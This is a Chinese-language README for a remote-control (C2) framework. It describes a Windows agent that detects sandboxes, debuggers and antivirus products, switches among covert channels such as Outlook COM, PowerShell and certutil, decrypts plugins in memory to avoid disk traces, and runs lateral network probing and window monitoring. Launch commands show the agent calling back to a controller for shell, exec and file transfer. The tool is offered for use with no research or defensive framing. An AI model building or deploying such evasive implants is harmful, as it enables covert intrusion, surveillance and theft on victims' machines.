# C2

智能自适应 C2 (Command & Control) 系统

## 架构

```
┌─────────────────────┐       多通道加密通信       ┌─────────────────────┐
│  Controller (Kali)  │ ◄──────────────────────► │   Agent (Windows)   │
│  controller/main.py │      RSA + AES-256-GCM     │   agent/main.py     │
└─────────────────────┘                            └─────────────────────┘
```

## 目录结构

```
├── agent/                  # 受控端
│   ├── main.py             # Agent 主入口
│   ├── sandbox_detect.py   # 沙箱/VM/调试器检测
│   ├── env_perception.py   # WMI 环境感知
│   ├── comm_channels.py    # 多通路隐蔽通信
│   ├── module_loader.py    # 加密插件加载器
│   ├── frag_transfer.py    # 分片传输
│   └── plugins/            # 插件目录
│       ├── netprobe.py     # 内网横向探测
│       └── winmon.py       # 窗口信息采集
├── controller/             # 控制端
│   ├── main.py             # Controller CLI 主入口
│   └── comm_server.py      # TCP 通信服务
├── shared/                 # 共享模块
│   ├── crypto.py           # 混合加密引擎 (RSA-2048 + AES-256-GCM)
│   └── protocol.py         # 通信协议定义
├── pack_plugin.py          # 插件打包加密工具
└── requirements.txt
```

## 功能

- **沙箱/VM/调试器检测** — 12 项检测（API 检测、注册表、MAC 前缀、磁盘大小、鼠标/键盘活动等），加权评分
- **环境感知** — WMI 采集系统信息，识别安全软件（火绒/360/Defender 等）和白名单应用
- **多通路隐蔽通信** — 6 种通道自动选择与切换：TCP > Outlook COM > SMTP/IMAP > PowerShell > UDP > Certutil
- **混合加密** — RSA-2048 密钥交换 + AES-256-GCM 数据加密，防重放，密钥内存清零
- **指令系统** — exec / sysinfo / download / upload / shell / netprobe / winmon
- **插件加密加载** — .py → .pyc → AES 加密 → .enc，运行时内存解密，不落地磁盘
- **分片传输** — 大数据自动分片，校验和验证，TCP 流控

## 快速开始

### 环境

- Python 3.10+
- Windows 10 (Agent)
- Kali Linux (Controller)

### 安装依赖

```bash
pip install -r requirements.txt
```

### 启动 Controller (Kali)

```bash
python controller/main.py --host 0.0.0.0 --port 9999
```

### 启动 Agent (Windows)

```bash
python agent/main.py <controller_ip>:9999
```

### 打包插件

```bash
python pack_plugin.py agent/plugins/ -o agent/plugins/ --key-file key.txt
```

## 依赖

- [pycryptodome](https://pypi.org/project/pycryptodome/) — AES/RSA 加密
- [pywin32](https://pypi.org/project/pywin32/) — Win32 API 调用
- [wmi](https://pypi.org/project/wmi/) — WMI 系统信息查询
- [scapy](https://pypi.org/project/scapy/) — 网络包处理
